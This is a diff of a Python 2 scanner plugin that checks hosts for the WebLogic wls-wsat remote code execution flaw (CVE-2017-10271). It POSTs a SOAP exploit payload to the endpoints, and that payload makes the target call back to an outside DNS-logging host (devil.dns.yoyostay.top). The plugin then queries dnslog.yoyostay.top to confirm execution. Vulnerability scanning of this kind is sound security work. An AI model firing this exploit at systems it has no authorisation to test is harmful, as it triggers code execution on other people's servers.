@@ -16,12 +16,10 @@ def random_str(len):
 
 
 
-@is_port_open
-def verify(ip, port=80, name='', timeout=10):
-    if is_http(ip, int(port)) is False:
-        return
+# @is_port_open
+def verify(ip, port=80, name='', timeout=10, types='ip'):
     test_str = random_str(6)
-    server_ip = "devil.yoyostay.top"
+    server_ip = "devil.dns.yoyostay.top"
     check_url = ['/wls-wsat/CoordinatorPortType','/wls-wsat/CoordinatorPortType11']
 
     heads = {
@@ -48,24 +46,36 @@ def verify(ip, port=80, name='', timeout=10):
         </soapenv:Envelope>
                 ''' % (test_str, server_ip)
     for url in check_url:
-        target_url = 'http://'+ip+':'+str(port)+url.strip()
-        req = urllib2.Request(url=target_url, headers=heads)
-        if 'Web Services' in urllib2.urlopen(req, timeout=timeout).read():
-                req = urllib2.Request(url=target_url, data=post_str, headers=heads)
-                try:
-                    urllib2.urlopen(req, timeout=15).read()
-                except urllib2.URLError:
-                    pass
-                sleep(2)
-                dnslog = 'http://dnslog.yoyostay.top/api/dns/devil/{}/'.format(test_str)
-                check_result = urllib2.urlopen(dnslog, timeout=timeout).read()
-                if "True" in check_result:
-                    info = {
-                        "url": target_url,
-                        "vuln_name": "weblogic wls rce(cve-2017-10271)",
-                        "severity": "high",
-                        "proof": dnslog
-                    }
-                    return info
+        if types == 'ip':
+            target_url = 'http://'+ip+':'+str(port)+url.strip()
         else:
-            pass
+            target_url = 'http://{}{}'.format(ip, url.strip())
+        try:
+            req = urllib2.Request(url=target_url, headers=heads)
+            if 'Web Services' in urllib2.urlopen(req, timeout=timeout).read():
+                    req = urllib2.Request(url=target_url, data=post_str, headers=heads)
+                    try:
+                        urllib2.urlopen(req, timeout=15).read()
+                    except Exception  as e:
+                        return None
+                    sleep(2)
+                    dnslog = 'http://dnslog.yoyostay.top/api/dns/devil/{}/'.format(test_str)
+                    try:
+                        check_result = urllib2.urlopen(dnslog, timeout=timeout).read()
+                    except Exception as e:
+                        return
+
+                    if "True" in check_result:
+                        info = {
+                            "url": target_url,
+                            "vuln_name": "weblogic wls rce(cve-2017-10271)",
+                            "severity": "high",
+                            "proof": dnslog
+                        }
+                        return info
+            else:
+                pass
+        except Exception as e:
+            return
+
+    return None
